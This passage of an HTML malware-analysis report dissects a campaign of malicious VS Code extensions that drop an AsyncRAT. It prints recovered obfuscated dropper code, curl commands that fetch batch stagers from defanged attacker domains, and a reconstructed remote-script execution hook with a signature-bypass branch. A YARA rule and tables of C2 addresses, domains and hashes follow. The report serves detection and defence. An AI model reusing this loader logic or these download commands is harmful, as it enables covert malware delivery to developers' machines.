+        Exits if RAM &lt; 3 GB, writes <code>@</code>-prefixed base64 lines to <code>C:\ProgramData\IntelDriver\VQR.cmd</code>, copies <code>powershell.exe</code> to <code>Downloads\&lt;4-char&gt;.exe</code> (<code>UkuG.exe</code>, <code>WBkO.exe</code>), and patches <code>amsi.dll</code>, <code>ntdll.dll</code>, and <code>clr.dll</code>.
+      </div>
+      <div class="cp-lock">
+        <span class="lock-label">Loader Link</span>
+        Identical on-disk staging path and persistence pattern across all three extension waves.
+      </div>
+    </div>
+
+    <div class="funnel-arrow">&#9660;</div>
+
+    <!-- Choke Point 3 -->
+    <div class="funnel-stage cp-3">
+      <div class="cp-meta">
+        <span class="cp-badge">Stage 3 &middot; Memory Crypter</span>
+        <h4>Donut x64 PIC Wrapper</h4>
+        <div class="cp-sub">DE AD BE CA FE BA EF + 13,436 B</div>
+      </div>
+      <div class="cp-body">
+        Injected shellcode region in <code>explorer.exe</code> starting with <code>DE AD BE CA FE BA EF</code> + <code>E8 &lt;rel32&gt;</code>, a 16-byte per-build key, and a 13,436-byte Donut loader stub.
+      </div>
+      <div class="cp-lock">
+        <span class="lock-label">Crypter Link</span>
+        Same generator version used across all 7 observed payload builds from September 19 through October 24.
+      </div>
+    </div>
+
+    <div class="funnel-arrow">&#9660;</div>
+
+    <!-- Choke Point 4 -->
+    <div class="funnel-stage cp-4">
+      <div class="cp-meta">
+        <span class="cp-badge">Stage 4 &middot; C2 Tier</span>
+        <h4>TCP 56001 Cluster</h4>
+        <div class="cp-sub">CN=Hlkfsmwtezz</div>
+      </div>
+      <div class="cp-body">
+        <code>216[.]107[.]139[.]88</code> (Latitude.sh), <code>185[.]94[.]29[.]79</code>, and <code>216[.]107[.]137[.]77</code> (Datacamp, same <code>216[.]107[.]136[.]0/22</code> block as <code>.139.88</code>) share the pinned certificate and plugin builds.
+      </div>
+      <div class="cp-lock">
+        <span class="lock-label">C2 &amp; Panel Link</span>
+        Same victim HWIDs and plugin hashes across servers; live chat sessions on <code>.137.77</code> dropped the "Pebble" handle.
+      </div>
+    </div>
+  </div>
+
+  <h3>5.2 Recovered Code Artifacts Across Stages</h3>
+
+  <h4>Wave 1: Verbatim <code>node_modules/boardflow/install.js</code> &amp; Leftover Manifest Identifiers</h4>
+  <p>
+    Static indexing of 162 cached Marketplace VSIX records and 481 detonation reports exposed two errors in how the operators cloned their Wave-1 extensions:
+  </p>
+  <ol>
+    <li><b>Un-scrubbed <code>Frux-Board</code> command in unrelated extensions:</b> Four extensions pretending to be font, music, and typewriter utilities (<code>FontingFonts.monkeyfont</code>, <code>MusicCreates.musicicgen</code>, <code>MicroLLC.typewriter-keyin</code>, and <code>TypinKey.typewritin-keyal</code>) all register <code>"onCommand:Frux-Board.open"</code> in <code>package.json</code>, left over from cloning <code>AgendaStudios.frux-board</code>.</li>
+    <li><b>Shared <code>javascript-obfuscator</code> seed and hand-written wrapper lines:</b> Twelve extensions carry the exact 5-space-padded import <code>const cp     = require('child_process');</code> at <code>src/extension.js:L6</code> and <code>const { spawn } = require('child_process');</code> at <code>src/patt.js:L5</code>. Inside <code>node_modules/boardflow/install.js</code>, <code>monkeyfont</code> (ext 895860) and <code>musicicgen</code> (ext 891611) carry a byte-identical obfuscated file generated from the same build instance (seed <code>_0x53192b=_0x57a6</code>), while <code>typewriter-keyin</code> (ext 733647) uses a second build from the same obfuscator configuration (seed <code>_0x4891a6=_0x1e1e</code>):</li>
+  </ol>
+  <pre>// Verbatim from FontingFonts.monkeyfont &amp; MusicCreates.musicicgen
+// File: node_modules/boardflow/install.js (Line 1, shared seed _0x53192b=_0x57a6)
+_0x53192b=_0x57a6;(function(_0x2942f9,_0x4b59b7){const _0x4fd574=_0x57a6,_0x22ea1a=_0x2942f9();while(!![]){try{const _0x1d931f=parseInt(_0x4fd574(0xe9))/0x1*(parseInt(_0x4fd574(0xd6))/0x2)+parseInt(_0...
+_0x4b26=function(){return _0x4815a8;};return _0x4b26();}const {exec}=require(_0x53192b(0xdc)+_0x53192b(0xd8)),path=require(_0x53192b(0xd4)),dest=path['join'](process.env.TEMP,_0x53192b(0xda)+_0x53192b(0xd9));
+
+// Resolved command at node_modules/boardflow/install.js:L36 (monkeyfont &amp; musicicgen):
+curl -L -o "C:\Users\Public\AppData\Local\Temp/b1f87428620729e52.bat" "hxxp://pxbble[.]com/b1f87428620729e52.bat"
+
+// Verbatim from MicroLLC.typewriter-keyin (node_modules/boardflow/install.js:L1, seed _0x4891a6=_0x1e1e):
+_0x4891a6=_0x1e1e;(function(_0x8c30d9,_0xeeda09){const _0x4506fd=_0x1e1e,_0x58d399=_0x8c30d9();while(!![]){try{const _0x3ac7ef=-parseInt(_0x4506fd(0x16d))/0x1+parseInt(_0x4506fd(0x175))/0x2+-parseInt(...
+
+// Resolved command at node_modules/boardflow/install.js:L36 (typewriter-keyin &amp; typewritin-keyal):
+curl -L -o "C:\Users\Public\AppData\Local\Temp/846385d443.bat" "hxxp://lnterstudios[.]org/7f82614a.bat"
+
+// Verbatim from LaunchAppsLLC.launchdesk-app (node_modules/vs-modules/resources.js:L14):
+process.env.PACKAGE_UPDATE_URL || "hxxp://boardflow[.]uk/package-update";</pre>
+
+  <h4>Wave 2 &amp; Wave 3: The Canvas Hook Verification Logic</h4>
+  <p>
+    In the flipped sleeper extensions (<code>framemap-dev</code>, <code>studiodocs-app</code>, <code>kanbantask-prod</code>, <code>studiotask-app</code>), the bundled npm dropper is replaced by a client that fetches <code>/api/canvases/sync?canvasId=system-welcome-canvas</code> and inspects the JSON object's <code>joinNote</code> field:
+  </p>
+  <ul>
+    <li><b>Server-side disarming (<code>"ghjgjghggjh"</code>):</b> When the C2 server disarms an extension (observed on most sandbox runs after October 5), the API returns <code>joinNote: "ghjgjghggjh"</code>, which the client ignores.</li>
+    <li><b>Signed hook path (<code>hook:v1:</code>):</b> A note formatted as <code>hook:v1:&lt;iat&gt;.&lt;exp&gt;.&lt;sig_b64&gt;.&lt;payload_b64&gt;</code> is checked against the current Unix timestamp and verified with Node's <code>crypto.verify</code> (Ed25519) using a public key fetched from <code>/api/canvases/hooks/pubkey</code> and cached in <code>trusted-hook-key.json</code>.</li>
+    <li><b>Unsigned bypass timestamp (<code>2026-09-11T00:00:00.000Z</code>):</b> If the note starts with <code>js:</code> or <code>file:</code> and the canvas JSON carries <code>createdAt === "2026-09-11T00:00:00.000Z"</code> (fired by <code>lagoonmedia.kanbantask-prod</code> on October 9), the client skips signature verification and executes the script directly. Either branch writes the payload to <code>~\.&lt;ext&gt;\hooks\hook-&lt;canvas&gt;-&lt;ts&gt;.js</code>, launches it via <code>cscript //nologo</code>, and deletes the file on exit:</li>
+  </ul>
+  <pre>async function applyCanvasJoinNote(canvas, extDir) {
+    const note = canvas.joinNote || "";
+    if (!note || note === "ghjgjghggjh") return;
+
+    let script = null;
+    if (note.startsWith("hook:v1:")) {
+        const [iat, exp, sigB64, codeB64] = note.slice(8).split(".");
+        const now = Math.floor(Date.now() / 1000);
+        if (now &gt;= Number(iat) &amp;&amp; now &lt;= Number(exp)) {
+            const pubKey = await loadHookPubKey(extDir); // /api/canvases/hooks/pubkey -&gt; trusted-hook-key.json
+            const signedBytes = Buffer.from(`${iat}.${exp}.${codeB64}`);
+            if (crypto.verify(null, signedBytes, pubKey, Buffer.from(sigB64, "base64"))) {
+                script = Buffer.from(codeB64, "base64").toString("utf8");
+            }
+        }
+    } else if ((note.startsWith("js:") || note.startsWith("file:")) &amp;&amp;
+               canvas.createdAt === "2026-09-11T00:00:00.000Z") {
+        script = extractNoteBody(note);
+    }
+
+    if (script) {
+        const hookPath = path.join(extDir, "hooks", `hook-${canvas.id}-${Date.now()}.js`);
+        fs.mkdirSync(path.dirname(hookPath), { recursive: true });
+        fs.writeFileSync(hookPath, script, "utf8");
+        execFile("cscript.exe", ["//nologo", hookPath], { windowsHide: true }, () =&gt; {
+            try { fs.unlinkSync(hookPath); } catch (_) {}
+        });
+    }
+}</pre>
+
+  <h2>6. Memory Forensics: The 7-Build Donut Crypter Marker and YARA Rule</h2>
+  <p>
+    Every campaign run that produced a memory dump (31 of 31 dumps captured between September 19 and October 24, 2026) contained an injected shellcode region inside <code>explorer.exe</code> with the same structure:
+  </p>
+  <pre>Offset (Hex)         Bytes / Value                                 Meaning
+-----------------------------------------------------------------------------------------------------------------
+0x00000000           DE AD BE CA FE BA EF                          7-byte crypter marker
+0x00000007           E8 &lt;rel32&gt;                                    CALL over the embedded instance; pushes offset 0x0C
+0x0000000C           &lt;DWORD instance_len&gt;                          Repeats &lt;rel32&gt; (matches the payload build size)
+0x00000010           &lt;16-byte key&gt;                                 Per-build key field
+0x00000020           &lt;Encrypted instance&gt;                          Encrypted Donut instance + .NET payload
+0x0000000C + &lt;rel32&gt; 59 48 83 E4 F0 48 89 4C 24 08 57 56 53 ...    pop rcx; and rsp, -16; (13,436-byte Donut x64
+                                                                   PIC loader stub, SHA-256:
+                                                                   714aaaabe16086b0f7d089d10a402f7a33691eb6a36118ba632a6256b283beec)</pre>
+
+  <p>
+    While the 13,436-byte Donut x64 loader stub is byte-identical across every dump, the encrypted instance length (<code>&lt;rel32&gt;</code>) varied across seven distinct builds over the five-week capture window:
+  </p>
+  <table>
+    <thead>
+      <tr>
+        <th>Build Size (CALL Length, Bytes)</th>
+        <th>Memory Dumps</th>
+        <th>Dates Observed</th>
+        <th>Notes</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono">432,484</td><td class="mono">5</td><td>Sep 19</td><td>Wraps the 412 KB <code>Xdggym</code> RAT build</td></tr>
+      <tr><td class="mono">436,399</td><td class="mono">8</td><td>Sep 19 to Sep 23</td><td>Wraps the 412 KB RAT build (C2 <code>216[.]107[.]139[.]88</code>)</td></tr>
+      <tr><td class="mono">433,161</td><td class="mono">5</td><td>Sep 21 to Sep 24</td><td>Wraps the 412 KB RAT build</td></tr>
+      <tr><td class="mono">286,192</td><td class="mono">2</td><td>Sep 25</td><td>Smaller payload build beaconing to <code>185[.]94[.]29[.]79:56001</code></td></tr>
+      <tr><td class="mono">431,355</td><td class="mono">2</td><td>Oct 02, Oct 06</td><td>Used in the <code>framemap-dev</code> and Oct 6 chat sessions</td></tr>
+      <tr><td class="mono">432,720</td><td class="mono">7</td><td>Oct 05 to Oct 23</td><td>Used in <code>studiodocs-app</code> and subsequent Oct runs</td></tr>
+      <tr><td class="mono">300,439</td><td class="mono">1</td><td>Oct 24</td><td><code>studiotask-app 1.2.1</code>; coincides with the Oct 24 plugin-set rebuild</td></tr>
+    </tbody>
+  </table>
+
+  <pre>rule MAL_VSCode_Boardflow_Donut_Hook_Loader {
+    meta:
+        author = "@James"
+        date = "2026-10-25"
+        description = "Detects the 7-byte Donut crypter marker (DE AD BE CA FE BA EF) in memory dumps and VQR.cmd / Canvas Hook artifacts on disk"
+    strings:
+        $donut_marker   = { DE AD BE CA FE BA EF E8 ?? ?? ?? 00 }
+        $donut_prologue = { 59 48 83 E4 F0 48 89 4C 24 08 57 56 53 }
+        $hook_api_1     = "/api/canvases/sync?canvasId=system-welcome-canvas" ascii wide
+        $hook_api_2     = "/api/canvases/hooks/pubkey" ascii wide
+        $loader_vqr     = "C:\\ProgramData\\IntelDriver\\VQR.cmd" ascii wide nocase
+    condition:
+        ($donut_marker and $donut_prologue) or (all of ($hook_api_*)) or $loader_vqr
+}</pre>
+
+  <h2>7. Indicators of Compromise (IOCs)</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Category</th>
+        <th>Indicator</th>
+        <th>Note</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono">RAT C2 (TCP 56001)</td><td class="mono">216[.]107[.]137[.]77:56001</td><td>Datacamp Limited; active Oct 2 to Oct 24, 2026 (live)</td></tr>
+      <tr><td class="mono">RAT C2 (TCP 56001-56003)</td><td class="mono">216[.]107[.]139[.]88:56001</td><td>Latitude.sh (same <code>216[.]107[.]136[.]0/22</code> as <code>.137.77</code>); active Sep 3 to Sep 24</td></tr>
+      <tr><td class="mono">RAT C2 (TCP 56001-56003)</td><td class="mono">185[.]94[.]29[.]79:56001</td><td>Active Sep 15 to Sep 25; shared plugins with <code>.139.88</code></td></tr>
+      <tr><td class="mono">Stager &amp; Carding IP</td><td class="mono">192[.]142[.]48[.]98</td><td>cPanel server hosting <code>pxbble[.]com</code>, <code>pebblexvale[.]com</code>, and <code>dump-central[.]cc</code></td></tr>
+      <tr><td class="mono">Cross-Sink Stager IP</td><td class="mono">135[.]233[.]95[.]144</td><td>Shared across both <code>lnterstudios[.]org</code> (<code>vlux-board</code>) and <code>pxbble[.]com</code> (<code>devora</code>)</td></tr>
+      <tr><td class="mono">Hook API Domains</td><td class="mono">www[.]canvases[.]ink | www[.]canvases[.]work | vibes-effecting[.]vercel[.]app</td><td>Serve <code>/api/canvases/sync?canvasId=system-welcome-canvas</code> and <code>/api/canvases/hooks/pubkey</code></td></tr>
+      <tr><td class="mono">Stager Domains</td><td class="mono">pebblexvale[.]com | pxbble[.]com | lnterstudios[.]org | boardflow[.]uk | giantapplebees[.]shop | pixelrbx[.]com | elrbx[.]com | trelloweb[.]com | pixelstudiodev[.]com | bunnistudios[.]lol | l83[.]me</td><td>Wave 1 to 3 batch and JScript stager hosts</td></tr>
+      <tr><td class="mono">Pinned TLS Cert</td><td class="mono">CN=Hlkfsmwtezz (8ae8963b7158976f16b7525cbed1ca910dc39800e7660bb7a1e2611ce264f59e)</td><td>Pinned AsyncRAT server certificate; client JA3 <code>fc54e0d16d9764783542f0146a98b300</code></td></tr>
+      <tr><td class="mono">Host Artifacts</td><td class="mono">C:\ProgramData\IntelDriver\VQR.cmd | %USERPROFILE%\Downloads\UkuG.exe / WBkO.exe | %APPDATA%\DBJm.xml / JNsN.xml | %LOCALAPPDATA%\gRpp.vbs | HKCU\Software\&lt;32-hex HWID&gt;\&lt;32-hex plugin&gt;</td><td>Staging directory, hidden PowerShell copies, scheduled tasks, and registry plugin cache</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Stager Hosts &amp; Payloads</h3>
+  <p>
+    The campaign utilized nine distinct stager hosts and payload delivery endpoints across the August to October waves:
+  </p>
+  <table>
+    <thead>
+      <tr>
+        <th>Host / Domain</th>
+        <th>Payload &amp; Delivery Pattern</th>
+        <th>Observed Activity</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td class="mono">boardflow[.]uk</td>
+        <td>Actor's eponymous domain (<code>www</code> resolves to Vercel DNS). Stager: <code>GET /package-update</code> via <code>curl</code> logged to <code>package-updates.log</code> (destination <code>216[.]198[.]79[.]x</code> / <code>64[.]29[.]17[.]x</code>).</td>
+        <td>2026 (lab-observed)</td>
+      </tr>
+      <tr>
+        <td class="mono">pebblexvale[.]com<br>(192[.]142[.]48[.]98)</td>
+        <td><code>pxbbzVkahQ5VT.bat</code> hosted behind a JavaScript bot challenge (standard Node.js <code>http.get</code> receives only challenge HTML; interactive browser receives the batch stager).</td>
+        <td>2026-10-24</td>
+      </tr>
+      <tr>
+        <td class="mono">pxbble[.]com</td>
+        <td><code>b1f87428620729e52.bat</code> stager for typography, generator, and dev tooling extensions (<code>monkeyfont</code>, <code>devora</code>, <code>fastmusicgen</code>, <code>musicicgen</code>).</td>
+        <td>2026-09-08 to 2026-09-14</td>
+      </tr>
+      <tr>
+        <td class="mono">trelloweb[.]com</td>
+        <td>Batch droppers <code>3f71211e6d884cfe.bat</code> and <code>b4dfbba06ccbh.bat</code>.</td>
+        <td>2026-09-20 to 2026-09-24</td>
+      </tr>
+      <tr>
+        <td class="mono">pixelstudiodev[.]com</td>
+        <td>Batch droppers <code>2eb39a20bd49194e2bb42.bat</code> and <code>QVZ2WkOYBB6tP4wt.bat</code>.</td>
+        <td>2026-09-14</td>
+      </tr>
+      <tr>
+        <td class="mono">bunnistudios[.]lol</td>
+        <td>Batch dropper <code>c0e707ea67cd9518c359.bat</code>.</td>
+        <td>2026-09-19</td>
+      </tr>
+      <tr>
+        <td class="mono">l83[.]me</td>
+        <td><code>coke.bat</code> dropper leading to C2 <code>185[.]94[.]29[.]79:56001</code>.</td>
+        <td>2026-09-15</td>
+      </tr>
+      <tr>
+        <td class="mono">giantapplebees[.]shop</td>
+        <td>JScript stager embedded within <code>Robloxboard.roblox-board</code> and <code>EthanRose.taskblox</code>.</td>
+        <td>2026 (long-lived)</td>
+      </tr>
+      <tr>
+        <td class="mono">lnterstudios[.]org<br>(lowercase L for I)</td>
+        <td>Wave 1 batch droppers impersonating studio branding.</td>
+        <td>2026-08 to 2026-09</td>
+      </tr>
+    </tbody>
+  </table>
+
+    <h3>File Hashes (SHA-256)</h3>
+  <table>
+    <thead>
+      <tr>
+        <th>File / Artifact</th>
+        <th>SHA-256</th>
+        <th>Context</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono">28d40000.dll ("Xdggym" RAT)</td><td class="mono">252d53dcbb481b1d2f60a874f83fab057c3e69d7e0f04b2115c70df51cc98c62</td><td>Unpacked 412 KB .NET AsyncRAT binary injected into <code>explorer.exe</code></td></tr>
+      <tr><td class="mono">Donut x64 Loader Stub (13,436 B)</td><td class="mono">714aaaabe16086b0f7d089d10a402f7a33691eb6a36118ba632a6256b283beec</td><td>Byte-identical position-independent loader stub across all 7 builds</td></tr>
+      <tr><td class="mono">pxbbzVkahQ5VT.bat</td><td class="mono">a44d233dab53c7182ac7cf4223956218934ba880f50acb8abea0dbcb0f371f93</td><td>Oct 24 batch stager on <code>pebblexvale[.]com</code> (<code>192[.]142[.]48[.]98</code>)</td></tr>
+      <tr><td class="mono">xqbiw5s4j2.bat</td><td class="mono">a5f2373bbbecac16ffe920cd79358a244c956e9f5a63d652484a2dbd41029572</td><td>Oct 06 batch stager (<code>"Chat with SirRatter"</code> session)</td></tr>
+      <tr><td class="mono">jmhu0sljrl.bat</td><td class="mono">f740fd10ee32fb3e700f7e2ceabdb50b13b7e0c43a581da223535b1c88d3ea2f</td><td>Oct 06 batch stager (<code>"Chat with SirFucksMotherAlot"</code> session)</td></tr>
+      <tr><td class="mono">BguYyUsWDTi4.js</td><td class="mono">321829abcb9661468ec6ec03dc0ca981e9e508f708061f6c43784fca38f7a117</td><td>Oct 24 JScript stager on <code>vibes-effecting[.]vercel[.]app</code></td></tr>
+      <tr><td class="mono">GKvhtWU.ps1</td><td class="mono">5a29622a27332c2399023ead1f25ea8f07a8a55ea2313635a2b07e82ea0dd71d</td><td>Decoded stage-2 PowerShell loader (AMSI/ETW/CLR patcher)</td></tr>
+      <tr><td class="mono">VQR.cmd (Oct 24)</td><td class="mono">420cb3f2909a42079325fea15556571c774573664b939a38602d35eeb04759a5</td><td>Base64 <code>@</code>-prefixed staging file in <code>C:\ProgramData\IntelDriver\</code></td></tr>
+      <tr><td class="mono">3f71211e6d884cfe.bat</td><td class="mono">94be6bae35790069ef79a5487af0d28cb610bf186a459691f4e6fb5bac264d5a</td><td>Served by <code>trelloweb[.]com</code> (Sep 20 to Sep 24)</td></tr>
+      <tr><td class="mono">c0e707ea67cd9518c359.bat</td><td class="mono">93de29d07dce332f287579d5cb3e2f544d558b05a74ee797521793d48f9301f3</td><td>Served by <code>bunnistudios[.]lol</code> (Sep 19)</td></tr>
+      <tr><td class="mono">b1f87428620729e52.bat</td><td class="mono">0b4fde2e8e98bca56ebe9f2b5fb048b338c829260e609d40b4338def11d56522</td><td>Served by <code>pxbble[.]com</code> (<code>192[.]142[.]48[.]98</code>, Sep 8 to Sep 18)</td></tr>
+      <tr><td class="mono">2eb39a20bd49194e2bb42.bat</td><td class="mono">76d4975d6048b3eac64eba2775b2cd139bf0039a8396c7f8a8dc18a3afc9779d</td><td>Served by <code>pixelstudiodev[.]com</code> (Sep 14)</td></tr>
+      <tr><td class="mono">coke.bat</td><td class="mono">dc17591e993dc178a023ae2da13593b9c01c8d2bf1e56377adfecf60e6b300c2</td><td>Served by <code>l83[.]me</code> &rarr; C2 <code>185[.]94[.]29[.]79:56001</code> (Sep 15)</td></tr>
+    </tbody>
+  </table>
+</article>
+
+<div class="lightbox" id="lightbox" onclick="this.classList.remove('open')">
+  <img id="lightboxImg" src="" alt="Enlarged">
+</div>
+<script>
+function openLightbox(src) {
+  document.getElementById('lightboxImg').src = src;
+  document.getElementById('lightbox').classList.add('open');
+}
+</script>
+</body>
+</html>
